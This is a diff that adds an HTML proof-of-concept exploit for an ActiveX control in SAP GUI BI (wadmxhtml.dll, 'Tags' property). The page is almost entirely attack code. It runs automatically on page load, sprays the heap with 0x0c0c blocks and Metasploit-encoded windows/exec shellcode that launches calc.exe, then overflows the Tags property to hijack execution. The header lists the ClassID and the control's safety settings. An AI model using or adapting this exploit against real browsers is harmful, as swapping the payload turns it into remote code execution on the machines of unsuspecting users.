@@ -1,0 +1,71 @@
+<!-- 
+
+Product: SapGUI BI
+File: c:\program files\sap\business explorer\bi\wadmxhtml.dl
+Version: 7100.1.400.8
+ClassID: 30DD068D-5AD9-434C-AAAC-46ABE37194EB
+RegKey Safe for Script: False
+RegKey Safe for Init: False
+Implements IObjectSafety: True
+IDisp Safe:  Safe for untrusted: caller,data  
+IPersist Safe:  Safe for untrusted: caller,data  
+KillBitSet: False
+
+Vulnerable Property: Tags
+-->
+<html>
+ <head>
+  <title></title>
+  <script language="JavaScript" defer>
+
+    var buf = '';
+    while (buf.length < 64) buf += unescape("%u0a05");
+
+
+    function Check() {
+	
+	// windows/exec - 557 bytes
+	// http://www.metasploit.com
+	// Encoder: x86/alpha_mixed
+	// EXITFUNC=process, CMD=c:\\windows\\system32\\calc.exe
+	var shellcode = unescape("%uc2dd%uc92b%u38b1%u4fba%uc033%ud9a3%u2474%u5ef4%u5631%u031a%u1a56%uc683%ue204%ucfba%u2a28%u3044%u4da9%ud5cd%u5f98%u9ea9%u6f89%uf3ba%u1b21%ue7ee%u69b2%u0726%uc772%u2610%ue983%ue49c%u6b47%uf760%u4b9b%u3859%u8aee%u259e%ude01%u2177%ucfb0%u77fc%uf109%uf3d2%u8931%uc357%u23c6%u1456%u3f76%u8c10%u67fc%uad80%u7bd1%ue4fc%u4f5e%uf777%u81b6%uc978%u4ef6%ue547%u8ffa%uc280%ue5e4%u30fa%ufd98%u4a39%u8b46%uecdf%u2b0d%u0c3b%uaac1%u02c8%ub9ae%u0696%u6d31%u33ad%u90ba%ub261%ub6f8%u9ea5%ud65b%u7afc%ue70d%u221e%u4df2%uc155%uf4e7%u8c34%u75f6%ue943%u85f9%u5a4b%ub492%u35c0%u48e5%u7203%u0319%ud309%ucab2%u61d8%uecdf%ua537%u6ee6%u56bd%u6e1d%u53b4%u2859%u2e25%uddf2%u9d49%uf7f3%u1b2a%ua450%u32db%u3006%ub24c%ue4a5%u4fce%u6633%uca9a%ubbae%u4950%udf6d%u1df5%u31ee%ua590%u4d95"); 	
+	
+	var bigblock = unescape("%u0c0c");
+	var headersize = 20;
+	var slackspace = headersize + shellcode.length;
+	while (bigblock.length < slackspace) bigblock += bigblock;
+	var fillblock = bigblock.substring(0,slackspace);
+	var block = bigblock.substring(0,bigblock.length - slackspace);
+	while (block.length + slackspace < 0x40000) block = block + block + fillblock;
+
+	
+	var memory = new Array();
+	for (i = 0; i < 550; i++){ memory[i] = block + shellcode; }
+			
+	var jmpblock = buf.substring(0, 32);
+
+	var a = new Array();
+	
+	for (i = 0; i < 512; i++) {
+		obj.Tags = jmpblock.substring(0, jmpblock.length);
+		a[i] = obj.Tags.substring(0, obj.Tags.length);
+		obj.Tags = '';
+		a[i] += jmpblock;
+	}	
+
+}
+
+
+
+   </script>
+  </head>
+
+ <body onload="JavaScript: return Check();">
+<object id="obj" classid="clsid:30DD068D-5AD9-434c-AAAC-46ABE37194EB">
+		Unable to create object
+	</object>
+
+
+
+ </body>
+</html>
